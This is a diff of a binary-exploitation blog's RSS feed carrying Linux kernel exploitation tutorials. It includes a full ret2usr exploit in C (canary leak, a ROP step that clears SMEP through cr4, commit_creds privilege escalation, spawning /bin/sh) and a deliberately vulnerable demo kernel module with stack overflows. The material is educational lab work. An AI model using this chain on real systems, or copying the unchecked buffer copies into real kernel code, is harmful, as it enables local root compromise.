-#include &amp;lt;stdlib.h&amp;gt;
-#include &amp;lt;assert.h&amp;gt;
-#include &amp;lt;unistd.h&amp;gt;
-#include &amp;lt;fcntl.h&amp;gt;
-unsigned long save_ss, save_sp, save_rf, save_cs;
-void shell()
-{
-system(&amp;#34;/bin/sh&amp;#34;);
-}
-void save_user_space()
-{
-/* save user-space */
-__asm__(
-&amp;#34;.intel_syntax noprefix;&amp;#34;
-&amp;#34;mov save_ss, ss;&amp;#34;
-&amp;#34;mov save_sp, rsp;&amp;#34;
-&amp;#34;pushf;&amp;#34;
-&amp;#34;pop save_rf;&amp;#34;
-&amp;#34;mov save_cs, cs;&amp;#34;
-&amp;#34;.att_syntax;&amp;#34;
-);
-}
-void load_user_space(unsigned long target)
-{
-/* return to user-space */
-__asm__(
-&amp;#34;.intel_syntax noprefix;&amp;#34;
-&amp;#34;swapgs;&amp;#34;
-&amp;#34;mov r15, save_ss;&amp;#34;
-&amp;#34;push r15;&amp;#34;
-&amp;#34;mov r15, save_sp;&amp;#34;
-&amp;#34;push r15;&amp;#34;
-&amp;#34;mov r15, save_rf;&amp;#34;
-&amp;#34;push r15;&amp;#34;
-&amp;#34;mov r15, save_cs;&amp;#34;
-&amp;#34;push r15;&amp;#34;
-&amp;#34;mov r15, %[rip];&amp;#34;
-&amp;#34;push r15;&amp;#34;
-&amp;#34;iretq;&amp;#34;
-&amp;#34;.att_syntax;&amp;#34;
-: [rip] &amp;#34;=&amp;amp;r&amp;#34; (target)
-);
-}
-void escalate_privileges()
-{
-/* escalate privileges */
-__asm__(
-&amp;#34;.intel_syntax noprefix;&amp;#34;
-&amp;#34;xor rdi, rdi;&amp;#34;
-&amp;#34;movabs rbx, 0xffffffff810881c0;&amp;#34; // prepare_kernel_cred
-&amp;#34;call rbx;&amp;#34;
-&amp;#34;movabs rbx, 0xffffffff81087e80;&amp;#34; // commit_creds
-&amp;#34;mov rdi, rax;&amp;#34;
-&amp;#34;call rbx;&amp;#34;
-&amp;#34;.att_syntax;&amp;#34;
-);
-/* return to user-space */
-load_user_space((unsigned long)shell);
-}
-unsigned long leak_canary(int fd)
-{
-unsigned long leak[32];
-read(fd, leak, sizeof(unsigned long) * 32);
-return leak[16];
-}
-void overflow_buffer(int fd, unsigned long canary)
-{
-unsigned long payload[21];
-payload[16] = canary;
-payload[17] = 0xffffffff8101b8d0; // pop rax ; ret
-payload[18] = 0x6f0; // rax = 0x6f0
-payload[19] = 0xffffffff8103a416; // mov cr4, eax ; ... ; ret
-payload[20] = (unsigned long)escalate_privileges;
-write(fd, payload, sizeof(unsigned long) * 21);
-}
-int main(int argc, char **argv)
-{
-save_user_space();
-int fd = open(&amp;#34;/proc/challenge&amp;#34;, O_RDWR);
-assert(fd &amp;gt; 0);
-/* leak stack canary */
-unsigned long canary = leak_canary(fd);
-printf(&amp;#34;[*] canary @ 0x%lx\n&amp;#34;, canary);
-overflow_buffer(fd, canary);
-return 0;
-}
-&lt;/code>&lt;/pre>
-&lt;/div>
-&lt;h2 id="appendix">Appendix&lt;/h2>
-&lt;ul>
-&lt;li>&lt;a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">Learning Linux Kernel Exploitation - Part 2&lt;/a>&lt;/li>
-&lt;li>&lt;a href="https://archive.org/details/youtube-g55Cq4WWykI">Hacking RootKit Development 16 - Bypass Linux Kernel 3.15 x86 CR4 &amp;amp; CR0 pinning protections&lt;/a>&lt;/li>
-&lt;/ul></content></item><item><title>Linux Kernel 0x01 :: Return to User-space</title><link>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</link><pubDate>Tue, 25 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</guid><description>Table of Contents User-space vs. Kernel-space Return to User-space Overview Saving the Initial State Restoring the Initial State Escalating Privileges in the Kernel A Vulnerable Kernel Module Exploiting the Kernel Module Environment Setup Building the Exploit User-space vs. Kernel-space Kernel-space is where the kernel runs and provides its services (i.e. where kernel code and kerenl modules run), whereas user-space is where user processes are executed. User-space code runs in it&amp;rsquo;s own carefully segregated piece of memory, where kernel-space code has access to the entirety of system memory.</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Anvbis</title><link>https://anvbis.github.io/</link><description>Recent content on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Anvbis</copyright><lastBuildDate>Tue, 25 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux Kernel 0x01 :: Return to User-space</title><link>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</link><pubDate>Tue, 25 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</guid><description>Table of Contents User-space vs. Kernel-space Return to User-space Overview Saving the Initial State Restoring the Initial State Escalating Privileges in the Kernel A Vulnerable Kernel Module Exploiting the Kernel Module Environment Setup Building the Exploit User-space vs. Kernel-space Kernel-space is where the kernel runs and provides its services (i.e. where kernel code and kerenl modules run), whereas user-space is where user processes are executed. User-space code runs in it&amp;rsquo;s own carefully segregated piece of memory, where kernel-space code has access to the entirety of system memory.</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
 &lt;ol>
 &lt;li>&lt;a href="#user-space-vs-kernel-space">User-space vs. Kernel-space&lt;/a>&lt;/li>
 &lt;li>&lt;a href="#return-to-user-space-overview">Return to User-space Overview&lt;/a>&lt;/li>
@@ -572,7 +93,6 @@ load_user_space(&lt;span style="color:#75715e">/* target return address */&lt;/s
 }
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/h2>
 &lt;p>I&amp;rsquo;ve written a vulnerable kernel module to demonstrate the exploit technique detailed above. This kernel module has buffer overflow vulnerabilities in both its &lt;code>challenge_read&lt;/code> and &lt;code>challenge_write&lt;/code> functions.&lt;/p>
-&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/1/challenge.c">challenge.c&lt;/a>&lt;/p>
 &lt;div class="collapsable-code">
 &lt;input id="1" type="checkbox" checked />
 &lt;label for="1">
@@ -587,20 +107,15 @@ load_user_space(&lt;span style="color:#75715e">/* target return address */&lt;/s
 #include &amp;lt;linux/proc_fs.h&amp;gt;
 #include &amp;lt;linux/uaccess.h&amp;gt;
 MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
-char out[256];
 static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
 {
 char tmp[128];
-memcpy(out, tmp, len);
-return copy_to_user(buf, out, len);
+return raw_copy_to_user(buf, tmp, len);
 }
 static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
 {
 char tmp[128];
-if (copy_from_user(out, buf, len))
-return -EINVAL;
-memcpy(tmp, out, len);
-return 0;
+return raw_copy_from_user(tmp, buf, len);
 }
 static int challenge_open(struct inode *inode, struct file *fp)
 {
@@ -635,18 +150,14 @@ proc_remove(proc_entry);
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_read&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
 {
 &lt;span style="color:#66d9ef">char&lt;/span> tmp[&lt;span style="color:#ae81ff">128&lt;/span>];
-memcpy(out, tmp, len);
-&lt;span style="color:#66d9ef">return&lt;/span> copy_to_user(buf, out, len);
+&lt;span style="color:#66d9ef">return&lt;/span> raw_copy_to_user(buf, tmp, len);
 }
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>In the code block below we can see the kernel module&amp;rsquo;s &lt;code>write&lt;/code> handler. It copies an arbitrary number of bytes into a 256 byte buffer &lt;code>out&lt;/code>, that are then copied into a buffer stored on the stack &lt;code>tmp&lt;/code> of size 128 bytes.&lt;/p>
 &lt;p>This gives us a buffer overflow of 128 bytes that we can potentially use to control process execution.&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_write&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
 {
 &lt;span style="color:#66d9ef">char&lt;/span> tmp[&lt;span style="color:#ae81ff">128&lt;/span>];
-&lt;span style="color:#66d9ef">if&lt;/span> (copy_from_user(out, buf, len))
-&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">-&lt;/span>EINVAL;
-memcpy(tmp, out, len);
-&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+&lt;span style="color:#66d9ef">return&lt;/span> raw_copy_from_user(out, buf, len);
 }
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploiting-the-kernel-module">Exploiting the Kernel Module&lt;/h2>
 &lt;p>First, let&amp;rsquo;s use the buffer overflow vulnerability in the kernel module&amp;rsquo;s &lt;code>read&lt;/code> function to dump a bunch of stack values. The below code reads 32 &lt;code>unsigned long&lt;/code> values (256 bytes) and prints them out.&lt;/p>
@@ -686,20 +197,7 @@ printf(&lt;span style="color:#e6db74">&amp;#34;%d: 0x%lx&lt;/span>&lt;span style
 15: 0xa73ee2eeab3d9f00
 16: 0xa73ee2eeab3d9f00 &amp;lt;-- stack canary
 17: 0xffff888006bcd840 &amp;lt;-- return address
-18: 0xfffffffffffffffb
-19: 0xffffffff8123e347
-20: 0x1
-21: 0x0
-22: 0xffffffff811c89f8
-23: 0xffff888006bf5700
-24: 0xffff888006bf5700
-25: 0x7ffeeb3f3d10
-26: 0x100
-27: 0x0
-28: 0x0
-29: 0xffffffff811c8d1a
-30: 0x0
-31: 0xa73ee2eeab3d9f00
+...
 &lt;/code>&lt;/pre>&lt;p>Now we can write a function that leaks the stack canary, so we can use it later when we want to redirect process execution. From our investigation above we can see that the stack canary is stored at index 16 (just below the &lt;code>tmp&lt;/code> buffer on the stack).&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">leak_canary&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd)
 {
@@ -774,7 +272,6 @@ overflow_buffer(fd, canary);
 &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
 }
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>You can find the complete exploit code below.&lt;/p>
-&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/1/exploit.c">exploit.c&lt;/a>&lt;/p>
 &lt;div class="collapsable-code">
 &lt;input id="3" type="checkbox" checked />
 &lt;label for="3">
@@ -1050,7 +547,6 @@ make -C ../linux-$(KERNEL_VERSION) M=$(PWD) clean
 ...
 &lt;/code>&lt;/pre>&lt;h2 id="inserting-kernel-modules">Inserting Kernel Modules&lt;/h2>
 &lt;p>Before you can interact with your freshly compiled kernel module, it needs to be inserted into the kernel itself. Below is a pre-written kernel module that will be used for the purposes of this exercise. Compile it and run the launch script to start.&lt;/p>
-&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/0/5/challenge.c">challenge.c&lt;/a>&lt;/p>
 &lt;div class="collapsable-code">
 &lt;input id="2" type="checkbox" checked />
 &lt;label for="2">
@@ -1116,7 +612,6 @@ printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; removed&amp;
 &lt;p>The majority of user interaction with kernel modules is done via file-based operations. Once the kernel module entry has been opened, the module has function handlers for read and write operations. For the sake of simplicity, you can think of this as a kind of file-based socket.&lt;/p>
 &lt;p>Interaction is performed first by opening the module entry. When you read from that open file descriptor the kernel module&amp;rsquo;s &lt;code>read&lt;/code> handler is called. When you write to the open file descriptor the kernel module&amp;rsquo;s &lt;code>write&lt;/code> handler is called.&lt;/p>
 &lt;p>Below is a pre-written kernel module that can be used for this exercise.&lt;/p>
-&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/0/6/challenge.c">challenge.c&lt;/a>&lt;/p>
 &lt;div class="collapsable-code">
 &lt;input id="3" type="checkbox" checked />
 &lt;label for="3">
@@ -1183,7 +678,6 @@ printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; removed&amp;
 &lt;li>Then it&amp;rsquo;ll perform a write, writing to the kernel module (calling its &amp;lsquo;write` handler function).&lt;/li>
 &lt;li>Finally it&amp;rsquo;ll close the file descriptor.&lt;/li>
 &lt;/ul>
-&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/0/6/exploit.c">exploit.c&lt;/a>&lt;/p>
 &lt;div class="collapsable-code">
 &lt;input id="4" type="checkbox" />
 &lt;label for="4">
@@ -1230,7 +724,6 @@ Here's some data!
 &lt;/code>&lt;/pre>&lt;h2 id="interacting-with-ioctl">Interacting with IOCTL&lt;/h2>
 &lt;p>As mentioned before, ioctl can provide us with much greater control over the way we interact with the kernel. Below is an example kernel module that will perform different actions depending on the input provided.&lt;/p>
 &lt;p>Here is a pre-written kernel module that you can use for this exercise.&lt;/p>
-&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/0/7/challenge.c">challenge.c&lt;/a>&lt;/p>
 &lt;div class="collapsable-code">
 &lt;input id="5" type="checkbox" checked />
 &lt;label for="5">
@@ -1335,7 +828,6 @@ printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; removed\n&am
 &lt;li>Next it&amp;rsquo;ll send the &lt;code>ioctl_num&lt;/code> for the &lt;code>HELLO&lt;/code> command, with a string pointer as the &lt;code>ioctl_param&lt;/code>.&lt;/li>
 &lt;li>Finally it&amp;rsquo;ll close the file descriptor.&lt;/li>
 &lt;/ul>
-&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/0/7/exploit.c">exploit.c&lt;/a>&lt;/p>
 &lt;div class="collapsable-code">
 &lt;input id="6" type="checkbox" />
 &lt;label for="6">
@@ -1386,14 +878,14 @@ return 0;
 &lt;/ul></content></item><item><title>About</title><link>https://anvbis.github.io/about/</link><pubDate>Mon, 03 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/about/</guid><description>About Me I just love binary exploitation, man.
 I&amp;rsquo;m currently expanding my knowledge about Linux kernel exploitation and browser exploitation (with a strong focus on V8 and JavaScript engines).
 Maybe I&amp;rsquo;ll get decent at it someday.
-Contact Me If you can solve the reversing challenge linked below you&amp;rsquo;ve earned my contact information.
+Contact Me If you can solve the reversing challenge linked below you&amp;rsquo;ll find my contact information.
 contact.zip
 $ md5sum ./contact 51f000ce9d06fddc6c08e2af16e24e3b ./contact</description><content>&lt;h2 id="about-me">About Me&lt;/h2>
 &lt;p>I just love binary exploitation, man.&lt;/p>
 &lt;p>I&amp;rsquo;m currently expanding my knowledge about Linux kernel exploitation and browser exploitation (with a strong focus on V8 and JavaScript engines).&lt;/p>
 &lt;p>Maybe I&amp;rsquo;ll get decent at it someday.&lt;/p>
 &lt;h2 id="contact-me">Contact Me&lt;/h2>
-&lt;p>If you can solve the reversing challenge linked below you&amp;rsquo;ve earned my contact information.&lt;/p>
+&lt;p>If you can solve the reversing challenge linked below you&amp;rsquo;ll find my contact information.&lt;/p>
 &lt;p>&lt;a href="https://anvbis.github.io/files/contact.zip">contact.zip&lt;/a>&lt;/p>
 &lt;pre>&lt;code>$ md5sum ./contact
 51f000ce9d06fddc6c08e2af16e24e3b ./contact
